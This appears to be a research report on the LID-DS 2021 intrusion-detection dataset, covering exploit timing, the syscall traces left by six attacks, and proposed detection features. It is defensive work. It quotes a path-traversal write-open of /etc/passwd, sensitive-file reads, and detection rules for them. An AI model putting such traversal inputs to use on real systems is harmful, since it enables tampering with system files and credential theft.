## Q2. Where does the "exploit" time mark start, how long does the attack last relative to the recording, and does the attack effect show up in the victim's syscalls at all?

### Takeaway
The exploit timestamp is set after the run to the first victim syscall whose data matches the attacker's first TCP packet. That marks when the attacker's traffic first arrives, which for several scenarios is a benign-looking request: a plain GET, a TLS Client Hello, an empty-credential probe, or a login-page load. Attack recordings last only about 10 to 30 s plus the exploit's own run time, and the harmful step in the five single-shot exploits takes well under a second. Every attack does leave a trace in the victim's syscalls. For Heartbleed, ZipSlip, CVE-2019-5418 and Juice-Shop that trace lies in arguments, sizes or return values, not in which syscalls run or how often.

### Cited Findings
- Timeline:
  - the framework starts the victim and waits for it to be ready;
  - `_warmup()` sleeps `warmup_time` (3 s in all six scenarios) and schedules the exploit at `time() + exploit_time`;
  - normal behaviour starts, then `_recording()` starts sysdig;
  - in auto-stop mode (`recording_time == -1`), recording runs until the exploit container stops, plus a random 5 to 15 s.
  — [LIDDS/lid_ds/core/scenario.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/lid_ds/core/scenario.py)
- With `recording_time == -1`, every scenario's `main.py` sets `exploit_time = random.randint(5, 15)`. Fixed-length recordings use 30 to 80 % of the recording time instead. — e.g. [LIDDS/scenarios/ZipSlip/main.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/ZipSlip/main.py), [CVE-2014-0160/main.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2014-0160/main.py)
- Recording plan (`record_all.sh`) for ZipSlip, CVE-2019-5418, CVE-2017-7529 and Bruteforce: 1000 normal recordings of 45 s (`main.py 1 45 0`), 100 normal+attack with auto-stop (`main.py 1 -1 1`), 20 attack-only, 30 idle of 45 s. Juice-Shop: 1000 normal, then 34 normal+attack and 7 attack-only for each of its three attacks, plus 30 idle. — [ZipSlip/record_all.sh](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/ZipSlip/record_all.sh), [CVE-2019-5418/record_all.sh](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2019-5418/record_all.sh), [CVE-2017-7529/record_all.sh](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2017-7529/record_all.sh), [Bruteforce_CWE-307/record_all.sh](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Bruteforce_CWE-307/record_all.sh), [Juice-Shop/record_all.sh](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Juice-Shop/record_all.sh)
- CVE-2014-0160 has no `record_all.sh` in the repository. — [LIDDS/scenarios/CVE-2014-0160/](https://github.com/LID-DS/LID-DS/tree/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2014-0160)
- At the scheduled time, `execute_exploit_at_time()` calls `Collector().set_exploit_time(command.name)` and runs each exploit step (exec, or a line on stdin). — [LIDDS/lid_ds/core/objects/attacker.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/lid_ds/core/objects/attacker.py)
- Post-processing: `optimize_attack_time()` rewrites each exploit step's time.
  - It finds the attacker IP's first TCP packet in the pcap, optionally the first one after a matcher for chained steps.
  - It then looks for the first victim syscall that (a) has an enter event whose first argument contains the attacker's `src:port->dst:port` and (b) has an exit whose `data=` overlaps the packet payload by at least 80 %.
  - It sets the time to that syscall (source "SYSDIG"), or else to the packet time ("TCPDUMP").
  — [LIDDS/lid_ds/postprocessing/postprocessing.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/lid_ds/postprocessing/postprocessing.py), [matcher.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/lid_ds/postprocessing/matcher.py), [tcpdump.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/lid_ds/postprocessing/tcpdump.py), [sysdig.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/lid_ds/postprocessing/sysdig.py)
- The LID-DS evaluator takes `metadata["time"]["exploit"][0]["absolute"]` as the exploit time. It counts at most one true alarm per exploit recording, so detection rate = alarm_count / exploit_count. — [LIDDS/algorithms/performance_measurement.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/algorithms/performance_measurement.py), [algorithms/ids.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/algorithms/ids.py)
- First attacker packet per scenario, from the exploit code:
  - Heartbleed: a TLS Client Hello (`establish_connect` sends `client_hello`) — [openssl_heartbleed.rb](https://github.com/rapid7/metasploit-framework/blob/6.1.5/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb)
  - Bruteforce: `find_auth_uri`'s GET with empty credentials — [http_login.rb](https://github.com/rapid7/metasploit-framework/blob/6.1.5/modules/auxiliary/scanner/http/http_login.rb)
  - CVE-2017-7529: a plain `requests.get(url)` to read Content-Length — [exploit.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2017-7529/exploit/exploit.py)
  - Juice-Shop `SQLInjectionUser`: Chrome's `driver.get(.../#/login)` — [exploit/userAction.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Juice-Shop/exploit/userAction.py)
  - ZipSlip, CVE-2019-5418 and Juice-Shop Schema/Cred: the malicious request itself (a single `curl`).
- Exploit containers end themselves (`pkill -f sleep`/`killall sleep`, or the Python entrypoint finishing), so the 5 to 15 s tail starts right after the exploit ends. — exploit scripts and Dockerfiles linked in Q1

### Inferences
- Attack recordings for the hard scenarios are about 3 s warm-up (not recorded) + 5 to 15 s of normal traffic before the exploit + the exploit + a 5 to 15 s tail, so roughly 10 to 30 s plus exploit run time.
- Rough durations of the harmful step:
  - Heartbleed: one connection of a few milliseconds.
  - ZipSlip: one PUT plus a JVM run of about a second; only the `openat`/`write` on `/etc/passwd` is anomalous.
  - CVE-2019-5418: one request of about 100 ms.
  - Juice Schema/Cred: one request; Juice User: a page load of a few seconds, of which one POST is malicious.
  - CVE-2017-7529: from one request to a short loop.
  - Bruteforce: up to 266 requests, probably tens of seconds.
- In 0.5 s windows, the single-shot attacks touch only one or two windows, and those windows are otherwise filled with concurrent normal traffic. CVE-2019-5418 has 10 to 15 normal users, for example. A count anomaly from one request is therefore diluted.
- Because the exploit time is the attacker's first packet, any alarm from the attacker's benign prelude also counts as a detection. Examples: CVE-2017-7529's plain GET (python-requests rather than Chrome), Bruteforce's probe, the Juice login page load. Alarms from the 5 to 15 s tail count too. Part of the 69.7 % (CVE-2017-7529) and 63.6 % (Juice) may come from such side effects rather than from the exploit's core.
- Does the effect show up in victim syscalls?
  - Heartbleed: yes, but only as byte counts (`res=` of read/write). The leaked memory travels inside the TLS response; with the 1600-byte snaplen, at most 1600 bytes of it are in `data=`. The decisive malformed-heartbeat evidence (declared length 65535 against a record length of 3) is in the network packet, which LID-DS also records as pcap. For a syscall-only HIDS, Heartbleed is effectively a network/payload-level attack.
  - ZipSlip: yes, in the `openat` path and flags plus a tiny write.
  - CVE-2019-5418: yes, in path arguments (`/etc/passwd` read by the Rails process).
  - CVE-2017-7529: yes, by code reading: a failing `sendfile` (`res=-22`) and a write to `error.log`. Not verified.
  - Juice-Shop: yes, but only in database read offsets, one database write and a log write, all syscalls the app already uses.
  - Bruteforce: yes, in rate and counts.

### Gaps
- `time.exploit[0].source` (SYSDIG or TCPDUMP) and the actual gap between that timestamp and the harmful syscall were not measured. To measure: read each attack `.json`, then find the first matching `openat`/`sendfile`/large `write` in the `.sc`.
- Real recording lengths and attack durations per scenario come from the dataset `.json` files (`time.warmup_end`, `time.exploit`, `recording_time`), which were not read here.
- Whether the 2021 `.sc` text files keep `data=` buffers, or only sizes and `res=` (`export.py` prints `%evt.args`), should be confirmed on one recording.

---

## Q3. Which of these are known to be hard in the literature, and why?

### Takeaway
No source I could open gives per-scenario LID-DS 2021 detection results for these six scenarios, so their difficulty is not established in the literature I could reach. The dataset authors report only scenario-averaged STIDE results. The one statement found about Heartbleed being unsuitable for syscall detection came from a search snippet whose page refused access. The primary sources do support the reasons Heartbleed is hard: nothing in the logs, and a leak via a TLS response.

### Cited Findings
- The LID-DS 2021 authors ran a STIDE variant as a baseline (n = 7, w = 100) and report only averages over all scenarios. "The 2021 version is more difficult to solve with the base algorithm than the 2019 version", with a lower F-score, a lower detection rate and more false alarms. The 2021 dataset has 15 scenarios and about 8.5 times as many syscalls as 2019. — [Extended Abstract: LID-DS 2021](https://dbs.uni-leipzig.de/files/research/publications/2023-07/pdf/CRITIS_2022_Extended_Abstract_LID-DS-2021.pdf)
- Heartbleed exploitation "does not leave any trace of anything abnormal happening to the logs". — [heartbleed.com](https://heartbleed.com/)
- nginx states that with standard modules CVE-2017-7529 leaks only a cache file header when the response came from cache. — [nginx advisory](https://mailman.nginx.org/pipermail/nginx-announce/2017/000200.html)
- LIGHT-HIDS (Gungor, Kale, Zhou, Rosing, arXiv 2509.13464, 2025) evaluates only two LID-DS subsets, brute force and SQL injection. F1 is about 0.973 on brute force and about 0.766 on SQL injection. The paper does not explain the gap and gives no per-scenario discussion of the six hard scenarios. — [arXiv 2509.13464](https://arxiv.org/html/2509.13464v1)

### Inferences
- The code-level reasons in Q1 match the general view that frequency and n-gram HIDS detect attacks that change control flow (new programs, new syscalls) and miss attacks that only change data (paths, sizes, content). Heartbleed, ZipSlip, CVE-2019-5418 and the Juice SQL injections are "data-only" attacks on the victim's normal code path. This general framing is my synthesis and not a sourced claim.

### Gaps
- A web search returned a snippet saying a 2026 comparative study in *Electronics* (TextRank system-call preprocessing with deep learning, DOI 10.3390/electronics15091856) excluded CVE-2014-0160 because "its attack characteristics depend heavily on network-packet-level behavior". The MDPI and ResearchGate pages both returned HTTP 403, so I could not open it. Treat the claim as unverified until the PDF is read.
- Per-scenario LID-DS 2021 results (STIDE, LSTM, Transformer, system-call-graph methods) were not found in openly reachable pages. Candidate sources to read next: the full *Dataset Report: LID-DS 2021* (Grimmer et al., CRITIS 2022, Springer LNCS, DOI 10.1007/978-3-031-35190-7_6) and Grimmer, Kaelble and Rahm, "Improving host-based intrusion detection using thread information" (2021). Neither was opened.
- No published IDS rule text (for example Snort or Suricata Heartbleed signatures) was opened. The network-signature point therefore rests on the Metasploit request format, not on a rule source.

---

## Q4. Which observable would reveal each scenario? (summary for Pulse feature design)

### Takeaway
Each hard scenario has one cheap, specific observable that syscall-ID counts cannot carry:
- Heartbleed: the response/request byte ratio on one socket.
- ZipSlip: write-opens outside the working directory or into `/etc`.
- CVE-2019-5418: path opens of sensitive files by the web process.
- CVE-2017-7529: syscall return values (EINVAL from `sendfile`) and writes to `error.log`.
- Juice-Shop: little at syscall level beyond database I/O shape, so it needs either the novelty rule or application-layer content.

Bruteforce is already caught by rate and counts.

### Cited Findings
- The observables are available in LID-DS 2021: the records contain arguments, return values and network data — [Extended Abstract](https://dbs.uni-leipzig.de/files/research/publications/2023-07/pdf/CRITIS_2022_Extended_Abstract_LID-DS-2021.pdf). sysdig captures I/O buffers up to 1600 bytes, and a pcap is recorded — [victim.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/lid_ds/core/objects/victim.py).
- Pulse currently uses syscall-ID counts and transition bins over 0.5 s windows, with no arguments. — local file `sentinel_pulse/lidds/convert.py` (docstring and `WINDOW = 0.5`)

### Inferences

| Scenario | Victim process / container | New process? | New syscall types? | Unusual paths? | Unusual sizes / return values? | Network-only? | Best distinguishing signal |
|---|---|---|---|---|---|---|---|
| CVE-2014-0160 | apache2 + mod_ssl (Ubuntu 13.04) | No | No (normal also does early heartbeats) | No | Yes: read about 8 B then write about 65 KB on one socket (normal: about 4 to 16 KB in and out) | Essentially yes: the over-read is in user space; the payload signature is in the TLS record | Per-fd bytes out / bytes in, or the maximum write size per connection; pcap heartbeat length > record length |
| ZipSlip | python3 `ZipService.py` + child `java Unpack` (Ubuntu 16.04) | No (java child is spawned on every upload) | No | Yes: `openat("evil/../…/etc/passwd", O_WRONLY|O_CREAT|O_TRUNC)` | Yes: tiny write; far fewer writes than normal | No | Path rule: write-open outside `/service/upload`, `..` in path, or a write to `/etc/*` |
| CVE-2019-5418 | ruby/puma `rails s` (ruby:2.5.1) | No | No | Yes: stat/open of `/etc/passwd` instead of `/app/routes_src/*.md` | Similar size | No | Sensitive-path read by the web process; path outside the app root |
| CVE-2017-7529 | nginx 1.6.3 worker (Ubuntu 14.04), static files, no cache | No | Probably no | `error.log` write (normally only `access.log`) | Yes, by code: `sendfile` → `-EINVAL`; aborted connection | No | Error return values per window; writes to the `error.log` fd. Also Range-request rate (pcap/HTTP) |
| Juice-Shop | node (juice-shop v10.0.0) + SQLite file | No | One new ID seen by Pulse (which one is unknown) | No new files (same `juiceshop.sqlite`) | Different SQLite page reads; challenge-solve write; log line | Mostly application-layer (SQL in the HTTP request) | Novelty rule (already fires); argument features such as SQLite read offsets or log writes; HTTP payload inspection |
| Bruteforce_CWE-307 | apache2 (same image as Heartbleed) | No | No | Repeated reads of `.htpasswd` (by inference) | Many small 401 responses | No | Request/accept rate and 401 burst; already caught at 96.4 % |
| 100 % group | various | Yes (sh/bash/wget/touch/uname/id/cat, sqlmap traffic, reverse shells) | Yes (execve/clone/connect patterns not seen in training) | Often | Often | No | Already captured by ID counts and novelty |

- For Pulse:
  - The cheapest additions that would move the three worst scenarios (Heartbleed, ZipSlip, CVE-2019-5418) are a per-window maximum I/O size per fd (or the out/in ratio), and a path class for `openat` (outside the working tree, `/etc/*`, contains `..`).
  - A per-window count of negative return values would target CVE-2017-7529.
  - All of these need the `res=` and path arguments, which the LID-DS `.sc` files carry and Pulse's eBPF counters currently drop.
  - This is a design inference to test, not a measured result.

### Gaps
- None of the proposed signals has been measured on the recordings. The first check is to compute, per attack recording, the maximum read/write `res=` per fd, the openat paths and the negative-return counts around `time.exploit`, and compare them with the normal recordings of the same scenario.
